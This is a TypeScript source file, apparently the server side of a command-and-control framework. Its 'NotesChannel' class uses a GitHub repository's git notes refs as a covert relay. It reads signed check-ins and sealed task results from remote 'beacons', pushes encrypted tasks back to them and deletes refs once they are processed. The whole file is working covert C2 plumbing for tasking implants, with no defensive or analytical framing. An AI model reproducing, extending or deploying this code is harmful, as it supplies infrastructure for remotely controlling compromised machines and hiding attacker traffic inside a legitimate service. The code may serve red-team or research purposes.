import { createRequire } from "node:module";
import type { Octokit } from "@octokit/rest";
import type _SodiumModule from "libsodium-wrappers";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue } from "../TaskQueue.ts";
import {
  base64ToBytes,
  encryptForBeacon,
  openSealBox,
} from "../crypto/sodium.ts";
import {
  DurablePollState,
  PollRunner,
  repositoryPollScope,
} from "../lib/PollRunner.ts";
import { collectGitHubPages } from "../lib/GitHubPagination.ts";
import { sha256Hex } from "../store/index.ts";
import {
  assertAcceptedResult,
  checkinAuthorizesTaskDelivery,
  parseCheckinPayload,
  parseTaskResult,
  type SecureChannelServices,
} from "./ChannelServices.ts";
import {
  claimDeliveries,
  finishDeliveries,
  processIncomingArtifact,
  rejectArtifact,
} from "./ChannelRuntime.ts";

const sodium = createRequire(import.meta.url)(
  "libsodium-wrappers",
) as typeof _SodiumModule;

interface NotesChannelOpts {
  owner: string;
  repo: string;
  token: string;
  operatorSecretKey: Uint8Array;
  pollIntervalMs: number;
  octokit: Octokit;
}

export class NotesChannel {
  private readonly runner: PollRunner;
  private readonly ackProgress: DurablePollState;
  private readonly resultProgress: DurablePollState;

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue: TaskQueue,
    private readonly opts: NotesChannelOpts,
    private readonly services: SecureChannelServices,
  ) {
    const scope = repositoryPollScope(opts.owner, opts.repo);
    this.ackProgress = new DurablePollState(
      services.store,
      "notes-ack-poll",
      scope,
      0,
    );
    this.resultProgress = new DurablePollState(
      services.store,
      "notes-result-poll",
      scope,
      0,
    );
    this.runner = new PollRunner({
      name: "NotesChannel",
      intervalMs: opts.pollIntervalMs,
      poll: () => this.poll(),
      onError: (error) => {
        console.error(
          "[NotesChannel] Poll error:",
          error instanceof Error ? error.message : String(error),
        );
      },
    });
  }

  start(): void {
    this.runner.start();
    console.log("[NotesChannel] Started polling");
  }

  async stop(): Promise<void> {
    await this.runner.stop();
    console.log("[NotesChannel] Stopped");
  }

  private async poll(): Promise<void> {
    const { owner, repo } = this.opts;
    const deliveryEligible = await this.processAckRefs(owner, repo);
    await this.processResultRefs(owner, repo);
    await this.deliverPendingTasks(owner, repo, deliveryEligible);
  }

  private async processAckRefs(
    owner: string,
    repo: string,
  ): Promise<Set<string>> {
    const deliveryEligible = new Set<string>();
    const refs = await collectGitHubPages(
      (page, per_page) =>
        this.opts.octokit.rest.git.listMatchingRefs({
          owner,
          repo,
          ref: "notes/svc-a-",
          page,
          per_page,
        }),
      (response) => response.data,
    );
    for (const ref of refs.sort((a, b) =>
      a.object.sha.localeCompare(b.object.sha)
    )) {
      try {
        const blob = await this.opts.octokit.rest.git.getBlob({
          owner,
          repo,
          file_sha: ref.object.sha,
        });
        const id8 = ref.ref.slice("refs/notes/svc-a-".length);
        const messageId = `ack:${ref.ref}:${ref.object.sha}`;
        const processed = await processIncomingArtifact(
          this.services,
          this.ackProgress,
          {
            messageId,
            payload: blobPayload(blob.data),
            cursor: ref.object.sha,
          },
          "malformed Notes ACK blob",
          () => {
            const checkin = parseCheckinPayload(decodeBlob(blob.data));
            if (!checkin.beaconId.startsWith(id8)) {
              rejectArtifact("ACK ref does not match signed beaconId");
            }
            return checkin;
          },
          async (checkin) => {
            const status =
              await this.services.identities.verifyAndRegisterCheckin(
              checkin,
              checkin.beaconId,
              11,
            );
            return {
              outcome: checkinAuthorizesTaskDelivery(status)
                ? "accepted"
                : "duplicate",
              beaconId: checkin.beaconId,
            };
          },
        );
        if (processed.status === "conflicting_duplicate") {
          rejectArtifact("conflicting ACK ref");
        }
        if (
          processed.status === "processed" &&
          processed.outcome === "accepted" &&
          processed.value
        ) {
          deliveryEligible.add(processed.value.beaconId);
        }
      } catch (error) {
        console.warn(
          "[NotesChannel] ACK processing error:",
          (error as Error).message,
        );
      }
    }
    return deliveryEligible;
  }

  private async processResultRefs(owner: string, repo: string): Promise<void> {
    const refs = await collectGitHubPages(
      (page, per_page) =>
        this.opts.octokit.rest.git.listMatchingRefs({
          owner,
          repo,
          ref: "notes/svc-r-",
          page,
          per_page,
        }),
      (response) => response.data,
    );
    for (const ref of refs) {
      try {
        const blob = await this.opts.octokit.rest.git.getBlob({
          owner,
          repo,
          file_sha: ref.object.sha,
        });
        await sodium.ready;
        const operatorPublicKey = sodium.crypto_scalarmult_base(
          this.opts.operatorSecretKey,
        );
        const messageId = `result:${ref.ref}:${ref.object.sha}`;
        const processed = await processIncomingArtifact(
          this.services,
          this.resultProgress,
          {
            messageId,
            payload: blobPayload(blob.data),
            cursor: ref.object.sha,
          },
          "malformed Notes result blob",
          async () => {
            const sealed = decodeBlob(blob.data).trim();
            if (!sealed) rejectArtifact("result blob is empty");
            const result = parseTaskResult(new TextDecoder().decode(
              await openSealBox(
                sealed,
                operatorPublicKey,
                this.opts.operatorSecretKey,
              ),
            ));
            const resultRef =
              /^refs\/notes\/svc-r-([0-9a-f]{8})-([0-9a-f]{8})$/i
                .exec(ref.ref);
            if (
              !resultRef ||
              !result.beaconId.toLowerCase().startsWith(
                resultRef[1]!.toLowerCase(),
              ) ||
              !result.taskId.toLowerCase().startsWith(
                resultRef[2]!.toLowerCase(),
              )
            ) {
              rejectArtifact(
                "result ref does not match signed beaconId and taskId",
              );
            }
            return { result, sealed };
          },
          async ({ result, sealed }) => {
            const accepted = assertAcceptedResult(
              await this.services.tasks.acceptSignedResult(
                result,
                result.beaconId,
                {
                  channel: "notes",
                  messageId,
                  payloadDigest: sha256Hex(sealed),
                },
              ),
            );
            return {
              outcome: accepted,
              beaconId: result.beaconId,
              taskId: result.taskId,
            };
          },
        );
        if (processed.status === "conflicting_duplicate") {
          rejectArtifact("conflicting result ref");
        }
        if (processed.outcome !== "rejected") {
          await this.opts.octokit.rest.git.deleteRef({
            owner,
            repo,
            ref: ref.ref.replace("refs/", ""),
          });
        }
      } catch (error) {
        console.warn(
          "[NotesChannel] Result processing error:",
          (error as Error).message,
        );
      }
    }
  }

  private async deliverPendingTasks(
    owner: string,
    repo: string,
    deliveryEligible: ReadonlySet<string>,
  ): Promise<void> {
    for (const beaconId of deliveryEligible) {
      const pending = this.queue.getDeliverableTasks(beaconId, "notes");
      if (pending.length === 0) continue;
      const deliveries = claimDeliveries(
        this.services,
        "notes",
        beaconId,
        pending,
        Math.max(this.opts.pollIntervalMs * 2, 60_000),
      );
      if (deliveries.length === 0) continue;
      const beacon = this.registry.get(beaconId);
      if (!beacon) {
        finishDeliveries(
          this.services,
          deliveries,
          "permanent_failure",
          "beacon registry entry is unavailable",
        );
        continue;
      }

      try {
        const encrypted = await encryptForBeacon(
          JSON.stringify(deliveries.map(({ task }) => ({
            taskId: task.taskId,
            kind: task.kind,
            args: task.args,
            ref: task.ref,
          }))),
          await base64ToBytes(beacon.publicKey),
          this.opts.operatorSecretKey,
        );
        const blob = await this.opts.octokit.rest.git.createBlob({
          owner,
          repo,
          content: JSON.stringify(encrypted),
          encoding: "utf-8",
        });
        const ref = `notes/svc-t-${beaconId.slice(0, 8)}`;
        try {
          await this.opts.octokit.rest.git.updateRef({
            owner,
            repo,
            ref,
            sha: blob.data.sha,
            force: true,
          });
        } catch (error: any) {
          if (error?.status !== 404 && error?.status !== 422) throw error;
          await this.opts.octokit.rest.git.createRef({
            owner,
            repo,
            ref: `refs/${ref}`,
            sha: blob.data.sha,
          });
        }
        finishDeliveries(this.services, deliveries, "delivered");
        this.registry.updateActiveTentacle(beaconId, 11);
      } catch (error) {
        finishDeliveries(
          this.services,
          deliveries,
          "transient_failure",
          error,
        );
        console.warn(
          `[NotesChannel] Task delivery error for ${beaconId}:`,
          (error as Error).message,
        );
      }
    }
  }
}

function decodeBlob(blob: { encoding?: string; content: string }): string {
  return blob.encoding === "base64"
    ? atob(blob.content.replace(/\n/g, ""))
    : blob.content;
}

function blobPayload(blob: { encoding?: string; content: string }): string {
  return JSON.stringify({
    encoding: blob.encoding ?? "utf-8",
    content: blob.content,
  });
}
